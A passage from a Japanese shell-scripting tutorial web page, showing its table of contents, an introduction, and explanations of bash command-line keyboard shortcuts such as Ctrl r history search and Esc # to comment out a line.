<li><a href=#出力するファイルは都度新規作成ではなく追記する>出力するファイルは都度新規作成ではなく追記する</a></li>
</ol>
</li>
<li><a href=#columnコマンド>columnコマンド</a>
<ol>
<li><a href=#区切り文字を指定して表形式で表示する>区切り文字を指定して表形式で表示する</a></li>
</ol>
</li>
<li><a href=#commコマンド>commコマンド</a>
<ol>
<li><a href=#使い方>使い方</a></li>
<li><a href=#共通している行だけを表示する>共通している行だけを表示する</a></li>
<li><a href=#両方のファイルにある項目を表示>両方のファイルにある項目を表示</a></li>
</ol>
</li>
<li><a href=#joinコマンド>joinコマンド</a>
<ol>
<li><a href=#オプション無しの場合>オプション無しの場合</a></li>
<li><a href=#共通項の指定>共通項の指定</a></li>
</ol>
</li>
<li><a href=#jotコマンド-1>jotコマンド</a>
<ol>
<li><a href=#jotコマンド概要-1>jotコマンド概要</a></li>
<li><a href=#jotコマンドの書式-1>jotコマンドの書式</a></li>
<li><a href=#jotコマンドの主なオプション-1>jotコマンドの主なオプション</a></li>
<li><a href=#jotコマンド詳細説明-1>jotコマンド詳細説明</a></li>
<li><a href=#連番を作る-1>連番を作る</a></li>
<li><a href=#文字列と組み合わせた連番を作成する-1>文字列と組み合わせた連番を作成する</a></li>
<li><a href=#printf-のフォーマットで出力する-1>printf のフォーマットで出力する</a></li>
<li><a href=#連番の範囲を指定して出力する-1>連番の範囲を指定して出力する</a></li>
<li><a href=#乱数を出力する-1>乱数を出力する</a></li>
</ol>
</li>
<li><a href=#numfmtコマンド>numfmtコマンド</a>
<ol>
<li><a href=#数値を桁ぞろえやカンマ区切りで表示する>数値を桁ぞろえやカンマ区切りで表示する</a></li>
</ol>
</li>
<li><a href=#pasteコマンド>pasteコマンド</a>
<ol>
<li><a href=#ファイルの連結>ファイルの連結</a></li>
<li><a href=#区切り文字を指定する>区切り文字を指定する</a></li>
<li><a href=#行列を入れ替える>行列を入れ替える</a></li>
</ol>
</li>
<li><a href=#rev-コマンド>rev コマンド</a>
<ol>
<li><a href=#find-の出力結果を拡張子でソート>find の出力結果を拡張子でソート</a></li>
<li><a href=#ドメイン名リストのソート>ドメイン名リストのソート</a></li>
</ol>
</li>
<li><a href=#rsコマンド>rsコマンド</a>
<ol>
<li><a href=#行列の入れ替え>行列の入れ替え</a></li>
<li><a href=#awkコマンドで頑張ってみる場合>awkコマンドで頑張ってみる場合</a></li>
</ol>
</li>
<li><a href=#shufコマンド>shufコマンド</a>
<ol>
<li><a href=#基本的な使い方>基本的な使い方</a></li>
<li><a href=#出力する数を制限する>出力する数を制限する</a></li>
<li><a href=#数値の幅を制限する>数値の幅を制限する</a></li>
</ol>
</li>
<li><a href=#tacコマンド-1>tacコマンド</a>
<ol>
<li><a href=#単語を逆順に並べるには>単語を逆順に並べるには</a></li>
<li><a href=#catコマンドと同様の書式でファイルの結合>catコマンドと同様の書式でファイルの結合</a></li>
<li><a href=#結合したファイルをファイルに出力>結合したファイルをファイルに出力</a></li>
<li><a href=#tacコマンドには行番号を表示するオプションがない>tacコマンドには行番号を表示するオプションがない</a></li>
</ol>
</li>
<li><a href=#nlコマンド>nlコマンド</a>
<ol>
<li><a href=#行番号をつける>行番号をつける</a></li>
<li><a href=#行番号の書式を変更する>行番号の書式を変更する</a></li>
<li><a href=#行番号の手前のスペースを調整>行番号の手前のスペースを調整</a></li>
<li><a href=#開始番号を指定する>開始番号を指定する</a></li>
<li><a href=#catコマンドで頑張ってみる><code>cat</code>コマンドで頑張ってみる</a></li>
<li><a href=#awkコマンドで頑張ってみる>awkコマンドで頑張ってみる</a></li>
</ol>
</li>
<li><a href=#mapfileマップファイル>mapfile（マップファイル）</a>
<ol>
<li><a href=#データテキストの準備>データテキストの準備</a></li>
<li><a href=#普通のやり方-while-read-パターン>普通のやり方 while read パターン</a></li>
<li><a href=#普通のやり方-fileコマンドパターン>普通のやり方 fileコマンドパターン</a></li>
<li><a href=#登場-mapfile-を使う>登場！ mapfile を使う</a></li>
<li><a href=#列の代入>列の代入</a></li>
<li><a href=#データファイルからの入力>データファイルからの入力</a></li>
</ol>
</li>
<li><a href=#xargs>xargs</a>
<ol>
<li><a href=#タブを区切り文字として設定-デフォルト-スペース>タブを区切り文字として設定 (デフォルト: スペース)</a></li>
<li><a href=#コマンドを実行する前にコマンドをプロンプトする>コマンドを実行する前にコマンドをプロンプトする</a></li>
<li><a href=#1-行に-3-項目を表示>1 行に 3 項目を表示</a></li>
<li><a href=#実行前のプロンプト>実行前のプロンプト</a></li>
<li><a href=#find-の結果を-rm-する><code>find</code> の結果を <code>rm</code> する</a></li>
<li><a href=#ファイル名に空白が含まれるファイルを削除します-例-hello-2001>ファイル名に空白が含まれるファイルを削除します (例: 「hello 2001」)</a></li>
<li><a href=#ファイルをフォルダに移動>ファイルをフォルダに移動</a></li>
<li><a href=#最初の-100-番目のファイルをディレクトリ-例-d1-に移動します>最初の 100 番目のファイルをディレクトリ (例: d1) に移動します。</a></li>
<li><a href=#並行処理>並行処理</a></li>
<li><a href=#すべてのファイルを-a-から-b-にコピーします>すべてのファイルを A から B にコピーします</a></li>
<li><a href=#ファイル名をファイルの最初の行に追加します>ファイル名をファイルの最初の行に追加します</a></li>
<li><a href=#すべてのファイルの行数を出力>すべてのファイルの行数を出力</a></li>
<li><a href=#出力を-1-行にする>出力を 1 行にする</a></li>
<li><a href=#すべてのファイルの行をカウントし合計行もカウントします>すべてのファイルの行をカウントし、合計行もカウントします</a></li>
<li><a href=#xargs-と-grepを組み合わせる>Xargs と grepを組み合わせる</a></li>
<li><a href=#xargs-と-sed-etc-ディレクトリの下のすべての古い-ip-アドレスを新しい-ip-アドレスに置き換えます>Xargs と sed (/etc ディレクトリの下のすべての古い IP アドレスを新しい IP アドレスに置き換えます)</a></li>
</ol>
</li>
<li><a href=#grepコマンド>grepコマンド</a>
<ol>
<li><a href=#grepコマンド概要>grepコマンド概要</a></li>
<li><a href=#grepコマンドの書式>grepコマンドの書式</a></li>
<li><a href=#grepコマンドの主なオプション>grepコマンドの主なオプション</a></li>
<li><a href=#grepコマンド詳細説明>grepコマンド詳細説明</a></li>
<li><a href=#コマンドの実行結果から必要な箇所だけを抽出する>コマンドの実行結果から必要な箇所だけを抽出する</a></li>
<li><a href=#単語単位で検索する>単語単位で検索する</a></li>
<li><a href=#前後の行も表示する>前後の行も表示する</a></li>
<li><a href=#行番号付きで表示する>行番号付きで表示する</a></li>
<li><a href=#複数の文字列を指定して検索する>複数の文字列を指定して検索する</a></li>
<li><a href=#複数の文字列を指定して検索する-1>複数の文字列を指定して検索する</a></li>
<li><a href=#検索文字列をファイルから読み込む>検索文字列をファイルから読み込む</a></li>
<li><a href=#どちらも含む行を探したい場合>どちらも含む行を探したい場合</a></li>
<li><a href=#文字列を含まない行を対象にする>文字列を含まない行を対象にする</a></li>
</ol>
</li>
<li><a href=#sedコマンド>sedコマンド</a>
<ol>
<li><a href=#sedコマンドの書式>sedコマンドの書式</a></li>
<li><a href=#sedコマンドの主なオプション>sedコマンドの主なオプション</a></li>
<li><a href=#sedのバージョンを確認する>sedのバージョンを確認する</a></li>
<li><a href=#sedコマンド詳細説明>sedコマンド詳細説明</a></li>
<li><a href=#sedを使用した基本的なテキスト置換>&lsquo;sed&rsquo;を使用した基本的なテキスト置換</a></li>
<li><a href=#gオプションを使用してファイルの特定の行にあるテキストのすべてを置き換える>&lsquo;g&rsquo;オプションを使用して、ファイルの特定の行にあるテキストのすべてを置き換える</a></li>
<li><a href=#各行で一致する2番目の値のみを置き換える>各行で一致する2番目の値のみを置き換える</a></li>
<li><a href=#各行で一致する最後の値のみを置き換える>各行で一致する最後の値のみを置き換える</a></li>
<li><a href=#ファイル内の最初の一致を新しいテキストに置き換える>ファイル内の最初の一致を新しいテキストに置き換える</a></li>
<li><a href=#ファイル内の最後の一致を新しいテキストに置き換える>ファイル内の最後の一致を新しいテキストに置き換える</a></li>
<li><a href=#ファイルパスの検索と置換を管理するためのreplaceコマンドでのバックスラッシュのエスケープ>ファイルパスの検索と置換を管理するためのreplaceコマンドでのバックスラッシュのエスケープ</a></li>
<li><a href=#ファイルのフルパスをファイル名だけに置き換える>ファイルのフルパスをファイル名だけに置き換える</a></li>
<li><a href=#マッチした文字列のあとに出現した文字列が見つかった場合に置換する>マッチした文字列のあとに出現した文字列が見つかった場合に置換する</a></li>
<li><a href=#文字列に他のテキストが見つからない場合のみテキストを置き換える>文字列に他のテキストが見つからない場合のみテキストを置き換える</a></li>
<li><a href=#--1-を使用して一致するパターンの前に文字列を追加>' \ 1 &lsquo;を使用して、一致するパターンの前に文字列を追加</a></li>
<li><a href=#一致する行を削除>一致する行を削除</a></li>
<li><a href=#一致する行の後の2行を削除>一致する行の後の2行を削除</a></li>
<li><a href=#テキスト行の最後にあるすべてのスペースを削除>テキスト行の最後にあるすべてのスペースを削除</a></li>
<li><a href=#行で2回一致するすべての行を削除>行で2回一致するすべての行を削除</a></li>
<li><a href=#空行を削除>空行を削除</a></li>
<li><a href=#出力できない文字をすべて削除>出力できない文字をすべて削除</a></li>
<li><a href=#一致した場合行末に文字列を追加>一致した場合行末に文字列を追加</a></li>
<li><a href=#一致した場合行前に行を挿入>一致した場合行前に行を挿入</a></li>
<li><a href=#一致したら一致行の下に文字列を挿入>一致したら一致行の下に文字列を挿入</a></li>
<li><a href=#一致しない場合は行末に文字列を追加>一致しない場合は行末に文字列を追加</a></li>
<li><a href=#一致しない行を削除>一致しない行を削除</a></li>
<li><a href=#テキストの後にスペースを追加した後一致したテキストを複製する>テキストの後にスペースを追加した後、一致したテキストを複製する</a></li>
<li><a href=#文字列のリストの1つを新しい文字列に置き換える>文字列のリストの1つを新しい文字列に置き換える</a></li>
<li><a href=#一致した文字列を改行を含む文字列に置き換える>一致した文字列を改行を含む文字列に置き換える</a></li>
<li><a href=#ファイルから改行を削除し各行の最後にカンマを挿入>ファイルから改行を削除し各行の最後にカンマを挿入</a></li>
<li><a href=#カンマを削除し改行を追加してテキストを複数の行に分割>カンマを削除し、改行を追加して、テキストを複数の行に分割</a></li>
<li><a href=#大文字と小文字を区別しない一致を検索し行を削除>大文字と小文字を区別しない一致を検索し、行を削除</a></li>
<li><a href=#大文字と小文字を区別しない一致を見つけて新しいテキストに置き換える>大文字と小文字を区別しない一致を見つけて、新しいテキストに置き換える</a></li>
<li><a href=#大文字と小文字を区別しない一致を見つけて同じテキストのすべて大文字に置き換える>大文字と小文字を区別しない一致を見つけて、同じテキストのすべて大文字に置き換える</a></li>
<li><a href=#大文字と小文字を区別しない一致を見つけて同じテキストのすべての小文字に置き換える>大文字と小文字を区別しない一致を見つけて、同じテキストのすべての小文字に置き換える</a></li>
<li><a href=#テキスト内のすべての大文字を小文字に置き換える>テキスト内のすべての大文字を小文字に置き換える</a></li>
<li><a href=#行の番号を検索し番号の後に通貨記号を追加>行の番号を検索し、番号の後に通貨記号を追加</a></li>
<li><a href=#3桁を超える数値にカンマを追加>3桁を超える数値にカンマを追加</a></li>
<li><a href=#タブ文字を4つのスペース文字に置き換えます>タブ文字を4つのスペース文字に置き換えます</a></li>
<li><a href=#4つの連続するスペース文字をタブ文字に置き換えます>4つの連続するスペース文字をタブ文字に置き換えます</a></li>
<li><a href=#すべての行を最初の80文字に切り捨てます>すべての行を最初の80文字に切り捨てます</a></li>
<li><a href=#文字列の正規表現を検索しその後に標準テキストを追加>文字列の正規表現を検索し、その後に標準テキストを追加</a></li>
<li><a href=#文字列の正規表現とその後に見つかった文字列の2番目のコピーを検索します>文字列の正規表現と、その後に見つかった文字列の2番目のコピーを検索します</a></li>
<li><a href=#ファイルからの複数行のsedスクリプトの実行>ファイルからの複数行の<code>sed</code>スクリプトの実行</a></li>
<li><a href=#複数行のパターンに一致し新しい複数行のテキストに置き換える>複数行のパターンに一致し、新しい複数行のテキストに置き換える</a></li>
<li><a href=#パターンに一致する2つの単語の順序を置き換えます>パターンに一致する2つの単語の順序を置き換えます</a></li>
<li><a href=#コマンドラインから複数のsedコマンドを使用する>コマンドラインから複数のsedコマンドを使用する</a></li>
<li><a href=#sedを他のコマンドと組み合わせる>sedを他のコマンドと組み合わせる</a></li>
<li><a href=#ファイルに空の行を挿入>ファイルに空の行を挿入</a></li>
<li><a href=#ファイルの各行からすべての英数字を削除>ファイルの各行からすべての英数字を削除</a></li>
<li><a href=#を使用して文字列と一致させる>「&」を使用して文字列と一致させる</a></li>
<li><a href=#単語のペアを切り替える>単語のペアを切り替える</a></li>
<li><a href=#各単語の最初の文字を大文字に変換する>各単語の最初の文字を大文字に変換する</a></li>
<li><a href=#ファイルの行番号を出力する>ファイルの行番号を出力する</a></li>
</ol>
</li>
<li><a href=#名著紹介unixという考え方>【名著紹介】「UNIXという考え方」</a>
<ol>
<li><a href=#unix的なものの考え方とは何か>UNIX的なものの考え方とは何か？</a></li>
<li><a href=#このような方におすすめ>このような方におすすめ</a></li>
<li><a href=#主要目次>主要目次</a></li>
<li><a href=#詳細目次>詳細目次</a></li>
<li><a href=#ざっくりななめよみ鈴木めも>ざっくりななめよみ、鈴木めも</a></li>
<li><a href=#小さいものは美しいスモールイズビューティフル>小さいものは美しい　「スモールイズビューティフル」</a></li>
<li><a href=#一つのプログラムには一つの事をうまくやらせるわかることは分けること>一つのプログラムには一つの事をうまくやらせる　「わかることは分けること」</a></li>
<li><a href=#出来るだけ早く試作する反復と協調>出来るだけ早く試作する　「反復と協調」</a></li>
<li><a href=#効率より移植性bashとawkとsed>効率より移植性　bashとawkとsed</a></li>
<li><a href=#出力結果はasciiフラットファイルに保存する中間ファイルは作らないrdbは使わない>出力結果はASCIIフラットファイルに保存する　中間ファイルは作らない　RDBは使わない</a></li>
<li><a href=#ソフトウェアを梃子として使う>ソフトウェアを梃子として使う　</a></li>
<li><a href=#シェルスクリプトによって梃子の効果と移植性を高めるパイプ>シェルスクリプトによって梃子の効果と移植性を高める　パイプ</a></li>
<li><a href=#全てのプログラムをフィルタとして設計する>全てのプログラムをフィルタとして設計する</a></li>
<li><a href=#並行して考える>並行して考える</a></li>
<li><a href=#木を守る>木を守る</a></li>
</ol>
</li>
<li><a href=#自作コマンド圧縮ファイル自動解凍ツール>【自作コマンド】圧縮ファイル自動解凍ツール</a>
<ol>
<li><a href=#圧縮ファイルと実行コマンドパラメータ一覧>圧縮ファイルと実行コマンド、パラメータ一覧</a></li>
<li><a href=#実行例>実行例</a></li>
<li><a href=#作成>作成</a></li>
<li><a href=#使い方-1>使い方</a></li>
</ol>
</li>
<li><a href=#自作コマンドプログレスバーの作成>【自作コマンド】プログレスバーの作成</a>
<ol>
<li><a href=#使い方-2>使い方</a></li>
<li><a href=#実行手順>実行手順</a></li>
<li><a href=#ソースコード>ソースコード</a></li>
<li><a href=#使い方-3>使い方</a></li>
<li><a href=#実行結果>実行結果</a></li>
</ol>
</li>
<li><a href=#自作コマンド一時ファイルを作ることなくファイルの文字コードと改行コードをutf-８に変換するスクリプト>【自作コマンド】一時ファイルを作ることなく、ファイルの文字コードと改行コードをUTF-８に変換するスクリプト。</a>
<ol>
<li><a href=#必要なもの>必要なもの</a></li>
<li><a href=#nkf-インストールの手順>nkf インストールの手順</a></li>
<li><a href=#使い方-4>使い方</a></li>
<li><a href=#変換の流れ手動編>変換の流れ（手動編）</a></li>
<li><a href=#変換の流れ自動編>変換の流れ（自動編）</a></li>
<li><a href=#コマンドの内容>コマンドの内容</a></li>
<li><a href=#使い方-5>使い方</a></li>
</ol>
</li>
<li><a href=#自作bashシェルスクリプトでキー入力待ちプロンプトを実装する>【自作】BASHシェルスクリプトで「キー入力待ち」プロンプトを実装する</a>
<ol>
<li><a href=#何かを押せば処理を続けたい場合>何かを押せば処理を続けたい場合</a></li>
<li><a href=#yを押せば処理を続けnでabort終了したい場合>yを押せば処理を続け、Nでabort（終了）したい場合</a></li>
</ol>
</li>
<li><a href=#自作コマンドsshでサーバーにログインしてコマンドを実行後自動的にログアウトしてローカルに戻ってくる方法>【自作コマンド】sshでサーバーにログインしてコマンドを実行後、自動的にログアウトしてローカルに戻ってくる方法</a>
<ol>
<li><a href=#イメージ>イメージ</a></li>
</ol>
</li>
<li><a href=#自作コマンドシェルスクリプトでキー入力待ちプロンプトを実装する>【自作コマンド】シェルスクリプトで「キー入力待ち」プロンプトを実装する</a>
<ol>
<li><a href=#何かを押せば処理を続けたい場合-1>何かを押せば処理を続けたい場合</a></li>
<li><a href=#yを押せば処理を続けnでabort終了したい場合-1>yを押せば処理を続け、Nでabort（終了）したい場合</a></li>
</ol>
</li>
<li><a href=#ざっくりシリーズのご紹介>「ざっくり」シリーズのご紹介</a></li>
<li><a href=#書籍の紹介>書籍の紹介</a></li>
</ol>
</nav>
</div>
</aside>
<ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-8689199204567424 data-ad-slot=7088000027></ins>
<script>(adsbygoogle=window.adsbygoogle||[]).push({})</script>
<div class=article-content>
<h1 id=シェルスクリプト１０００本ノック>シェルスクリプト１０００本ノック</h1>
<p>　これからシェルスクリプトを勉強する人、なんとか本を見ながらかけるようになった人、バリバリ書いてきたけど、まだまだ知らないことがないものかと勉強熱心な人。</p>
<p>　そんな人達のために「シェルスクリプト１０００本ノック」をご紹介します。<br>
　興味のあるトピックを読むのもよし、上から順番に実行を確認して身につけるも良いです。<br>
　じっくりやれば時間もかかりますが、Linuxで生きていくなら知っておいて損のないページです。</p>
<p>　書いてあることを暗記する必要はありません。<br>
　どんなことが書いてあったかを覚えておけばよいです。<br>
　必要になればこのページを開いて探せばよいのですから。</p>
<p>　シェルスクリプトでプログラムを書くにあたって、ちまたの本にはなかなか書いていないTIPSもいくつか紹介します。<br>
　まずは、「ターミナルのTIPS」でキーボードショートカットを覚えましょう。<br>
　「bashのTIPS」は、中級者のbashプログラマにとっても大いに参考になると思います。<br>
　「名著紹介」では、僕がプログラマとしておおいに感銘を受けた一冊のエッセンスをご紹介します。是非購入して購読いただければと思います。UNIXという考え方をしっかり意味のあるこころのある内容で説明してくれた数少ない素晴らしい名著です。<br>
　シェルクスクリプトを作るためにおおよそ必要なコマンドリファレンスをページの中盤から集めてあります。<br>
　特に、シェルスクリプトを支える三本柱であるgrepやawk、sedといったコマンドについては、情報を厚めに入れてあります。</p>
<p>　ページ後半には、自作コマンドを数本紹介しています。<br>
　すべてシェルスクリプトで作ってありますので、改造してより良いコマンドに仕上げてもらえれば嬉しいです。</p>
<p>　grepやawk、sedコマンドなどを駆使したシェルスクリプトでできることは無限です。<br>
　すべてを覚えてしまおうというのはどだい無理なのです。<br>
　まずは、このページのコマンドを順番に実行して、感覚を身につけてください。<br>
　浅くとも何度も繰り返し反復することで、直感的に理解して実行することができます。</p>
<p>　ちなみに１０００本というのは勢い余って言っているに過ぎません。<br>
　初稿はだいたい７００本です。</p>
<p>　これからも内容を充実させていくつもりです。<br>
　では、シェルスクリプトを楽しんでください！</p>
<h2 id=ターミナルのtips>ターミナルのTIPS</h2>
<h3 id=ctrl-f-カーソル位置を後方に１文字ずつ移動>Ctrl f カーソル位置を後方に１文字ずつ移動</h3>
<p><code>Ctrl f</code>は、カーソル位置を後方に１文字ずつ移動します。</p>
<pre tabindex=0><code>Ctrl f : カーソル位置を後方に１文字ずつ移動します。
</code></pre><h3 id=ctrl-b-カーソル位置を前方に１文字ずつ移動>Ctrl b カーソル位置を前方に１文字ずつ移動</h3>
<p><code>Ctrl b</code>は、カーソル位置を前方に１文字ずつ移動します。</p>
<pre tabindex=0><code>Ctrl b : カーソル位置を前方に１文字ずつ移動します。
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>矢印カーソルキーで移動させれば良い話。ではありますが、Ctrl+f,Ctrl+bで移動できるようになると、キーボードのホームポジションから指を離すことなく、素早く移動できます。</dd>
</dl>
</div>
<h3 id=ctrl-l-画面をクリアする>Ctrl l 画面をクリアする</h3>
<p><code>Ctrl l</code>は、画面がコマンドで一杯になった、ログを出力して画面が埋まってしまう、等の場合、<code>Ctrl l</code>コマンドで画面をクリアすることができます。<br>
日常的に非常によく使うコマンドです。</p>
<pre tabindex=0><code>Ctrl l : クリアと同等。 
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>とても頻度の高いキーボードショートカットです。是が非でも覚えておくと良いでしょう。</dd>
</dl>
</div>
<h3 id=ctrl-m-enterキーを使わない>Ctrl m Enterキーを使わない</h3>
<p><code>Ctrl m</code>は、キーボードのEnterキーと同じ挙動です。<br>
メリットは、指をFとJといったホームポジションから外すことなく操作できることです。</p>
<pre tabindex=0><code>Ctrl m : Enterと同じ
</code></pre><h3 id=ctrl-n-下矢印キーを使わない>Ctrl n 下矢印キーを使わない</h3>
<p><code>Ctrl n</code>は、キーボードの下矢印キーと同様の振る舞いをします。<br>
メリットは、指をFとJといったホームポジションから外すことなく操作できることです。</p>
<pre tabindex=0><code>Ctrl n : 下矢印と同じ。 
</code></pre><h3 id=ctrl-p-上矢印キーを使わない>Ctrl p 上矢印キーを使わない</h3>
<p><code>Ctrl p</code>は、キーボードの上矢印キーと同様の振る舞いをします。<br>
メリットは、指をFとJといったホームポジションから外すことなく操作できることです。</p>
<pre tabindex=0><code>Ctrl p : 上矢印と同じ。 
</code></pre><h3 id=ctrl-r-同じコマンドを再入力しない>Ctrl r 同じコマンドを再入力しない</h3>
<p><code>Ctrl r</code>は、コマンド履歴の後方検索を開始します (後方に移動するには Ctrl r を押し続けます)<br>
<code>Ctrl p</code>や<code>Ctrl n</code>で過去のコマンド履歴を順にたどっていってもよいのですが、過去のコマンド履歴を簡単に検索して実行することができます。<br>
<code>Ctrl r</code>を押して、冒頭行から数文字を入力することでマッチする過去のコマンドが表示されます。</p>
<pre tabindex=0><code>Ctrl r : コマンド履歴の後方検索
</code></pre><h3 id=ctrl-h-カーソル位置の手前の文字を削除backspaceキーを使わない>Ctrl h カーソル位置の手前の文字を削除（BackSpaceキーを使わない）</h3>
<p><code>Ctrl h</code>は、キーボードのBackSpace、Macではdeleteキーと同じ挙動です。<br>
メリットは、指をFとJといったホームポジションから外すことなく操作できることです。</p>
<pre tabindex=0><code>Ctrl h : BackSpaceと同じ。カーソル位置の手前の文字を削除します。
</code></pre><h3 id=ctrl-a-コマンド行先頭へジャンプ>Ctrl a コマンド行先頭へジャンプ</h3>
<p><code>Ctrl a</code>は、コマンドの行頭に移動します。<br>
頻繁に利用される必須のコマンドの1つです。</p>
<pre tabindex=0><code>Ctrl a : 行頭に移動します。 
</code></pre><h3 id=ctrl-e-コマンド行末へジャンプ>Ctrl e コマンド行末へジャンプ</h3>
<p><code>Ctrl e</code> コマンドの行末に移動します。<br>
頻繁に利用される必須のコマンドの1つです。</p>
<pre tabindex=0><code>Ctrl e : 行末に移動します。 
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>この３つのキーボードショートカットは、ＰＣのほぼすべてのテキスト列共通で使えます。</dd>
</dl>
</div>
<h3 id=ctrl-d-カーソル位置の文字を削除backspcedeleteとは異なります>Ctrl d カーソル位置の文字を削除（BackSpce/deleteとは異なります）</h3>
<p><code>Ctrl d</code>は、カーソルの下の文字を削除します。<br>
BackSpce/deleteは、カーソル手前の一文字を削除しますが、このコマンドはカーソル位置の文字を削除します。</p>
<pre tabindex=0><code>Ctrl d : カーソル下の文字を削除します。
</code></pre><h3 id=ctrl-u-カーソル位置の手前から行頭までのすべてのテキストを削除>Ctrl u カーソル位置の手前から行頭までのすべてのテキストを削除</h3>
<p><code>Ctrl u</code>は、行頭まで削除します。<br>
カーソルの１文字手前から行頭までを削除します。</p>
<pre tabindex=0><code>Ctrl u : カーソル位置の手前から行頭までのすべてのテキストを削除します。
</code></pre><h3 id=ctrl-k-カーソル位置から行末までのすべてのテキストを削除>Ctrl k カーソル位置から行末までのすべてのテキストを削除</h3>
<p><code>Ctrl k</code>は、カーソルから行末までのすべてのテキストを削除します。<br>
<code>vim</code>の <code>Shift d</code>コマンドと同じです。</p>
<pre tabindex=0><code>Ctrl k : カーソルから行末までのすべてのテキストを削除します。 
</code></pre><h3 id=ctrl-x-backspace-カーソル位置から行頭までのすべてのテキストを削除します>Ctrl x BackSpace カーソル位置から行頭までのすべてのテキストを削除します。</h3>
<p><code>Ctrl x BackSpace</code>は、行頭からカーソルまでのすべてのテキストを削除します。<br>
<code>BackSpace</code>を使わずに<code>Ctrl h</code>を使う。とか言っておきながらなんなのですが、便利なので覚えてください。<br>
Ctrl xに続いてBackSpceを押します。</p>
<pre tabindex=0><code>Ctrl x backspace : 行頭からカーソルまでのすべてのテキストを削除します。 
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>この３つのキーボードショートカットは、ＰＣのほぼすべてのテキスト列共通で使えます。<br>
消したい場所にカーソルで移動して、消したい文字の数だけDeleteキーを押すという必要がないのです。</dd>
</dl>
</div>
<h3 id=ctrl-t-前後の文字を入れ替え>Ctrl t 前後の文字を入れ替え</h3>
<p><code>Ctrl t</code> は、カーソルの前の文字をカーソルの下の文字と入れ替えます。<br>
例えば Windows というコマンドを入力したいとします。<br>
キーボードの入力で Windwos となってしまった場合、wとoを入れ替えたいと考えます。<br>
この場合、windwosの o にカーソルを移動して <code>Ctrl t</code> を実行します。</p>
<pre tabindex=0><code>Ctrl t : カーソルの前の文字をカーソルの下の文字と入れ替えます。Esc t を押すと、カーソルの前の 2 つの単語が入れ替えられます。 
</code></pre><h3 id=ctrl-w-カーソル位置の手前の単語を切り取り貼り付ける>Ctrl w カーソル位置の手前の単語を切り取り貼り付ける</h3>
<p><code>Ctrl w</code>は、カーソルの前の単語を切り取ります。<br>
切り取った単語はクリップボードの保存されるので、<code>Ctrl y</code> で貼り付ける事ができます。</p>
<pre tabindex=0><code>Ctrl w : カーソルの前の単語を切り取ります。Ctrl y 貼り付けます 
</code></pre><h3 id=ctrl-u-カーソル位置の手前から行頭を切り取り貼り付けます>Ctrl u カーソル位置の手前から行頭を切り取り貼り付けます。</h3>
<p><code>Ctrl u</code>は、カーソル位置の手前から行頭にかけてすべての文字列を切り取ります。<br>
<code>Ctrl y</code>で貼り付ける事ができます。</p>
<pre tabindex=0><code>Ctrl u : カーソルの前の行を切り取ります。次に Ctrl y で貼り付けます
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>とにかく、ゆっくりとコマンドを入力することです。<br>
何度も繰り返しゆっくりと実行することで、いずれ素早く実行できるようになります。<br>
焦ってはいけません。</dd>
</dl>
</div>
<h3 id=超裏技-esc-shift-3-コマンドライン行をコメントアウトして改行>【超裏技】 Esc #(Shift 3) コマンドライン行をコメントアウトして改行</h3>
<p>このTIPSはものすごく便利です。<br>
必ず覚えておくと良いことがあります。</p>
<p>まず、ある程度長いコマンドを入力し終わってEnterキーを押して実行しようとしているとします。<br>
「あ・・」と、気がついて「ディレクトリに入るのを忘れてた」と思い出します。<br>
<code>cd hoge</code> など、ディレクトリ移動をして、先程の長いコマンドを再入力する。</p>
<p>こんな面倒なことってよくありますよね。</p>
<h3 id=一般的な方法-ctrl-a--shift-3>一般的な方法 Ctrl a ＋ #(Shift 3)</h3>
<pre tabindex=0><code>$ ./configure sutasuta hoihoi option=hoge
</code></pre><p>と、入力して、このコマンドラインのカーソル行を<code>Ctrl a</code>で先頭に移動して、#(Shift 3)を入力してEnterキーを押す。<br>
そうすると、コマンドラインは以下のようになります。</p>
<pre tabindex=0><code>$ #./configure sutasuta hoihoi option=hoge 
</code></pre><p>ここで改めて</p>
<pre tabindex=0><code>$ cd hoge
</code></pre><p>で、ディレクトリに入ってから、<code>Ctrl p</code>で１つ前のコマンドを呼び出して、行頭の<code>#</code>を<code>Ctrl d</code>で消します。</p>
<pre tabindex=0><code>$ #./configure sutasuta hoihoi option=hoge 
&lt;Ctrl d で行頭の # を消す&gt;
$ ./configure sutasuta hoihoi option=hoge 
&lt;Enterキーで実行&gt;
</code></pre><h3 id=超裏技-esc--shift-3>超裏技 Esc ＋ #（Shift 3）</h3>
<p>もう少し楽にできるショートカットが用意されています。<br>
<code>Esc</code> を押し離してから<code>#（Shift+3）</code>を押します。<br>
すると一瞬でコマンドラインの行頭に # が付与されて改行されます。</p>
<p>まず、先走ってコマンドラインを入力したとします。</p>
<pre tabindex=0><code>$ ./configure sutasuta hoihoi option=hoge 
</code></pre><p><code>Esc #</code> でコマンドラインをコメントアウトします。</p>
<pre tabindex=0><code>$ #./configure sutasuta hoihoi option=hoge 
</code></pre><p>その後、あらためて<code>cd hoge</code>でディレクトリ移動</p>
<pre tabindex=0><code>$ cd hoge
</code></pre><p><code>Ctrl p</code>で１つ前のコマンドを呼び出して、<code>Ctrl d</code>で行頭の<code>#</code>を消す</p>
<pre tabindex=0><code>&lt;Ctrl p&gt;で１つ前のコマンドを呼び出す
$ #./configure sutasuta hoihoi option=hoge 

&lt;Ctrl d で行頭の # を消す&gt;
$ ./configure sutasuta hoihoi option=hoge 

&lt;Enterキーで実行&gt;
</code></pre><p>まとめると、</p>
<ol>
<li><code>Esc #</code>でコマンドラインをコメントアウト</li>
<li>何らかの別コマンドを入力</li>
<li><code>Ctrl p</code>で先程のコマンドラインを呼び出す</li>
<li><code>Ctrl d</code>で行頭の<code>#</code>を削除してEnter</li>
</ol>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd><code>Esc #</code> はコマンドライン全体をコメントアウトして改行するコマンドです。<br>
一度入力したコマンドを再入力する手間が省けます。</dd>
</dl>
</div>
<h2 id=bashのtips>bashのTIPS</h2>
<h3 id=set--ueo>set -ueo</h3>
<p><code>set</code>コマンドで便利にプログラミングする手法を紹介します。古来から伝わる便利な一行です。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=cp>#! /usr/bin/bash
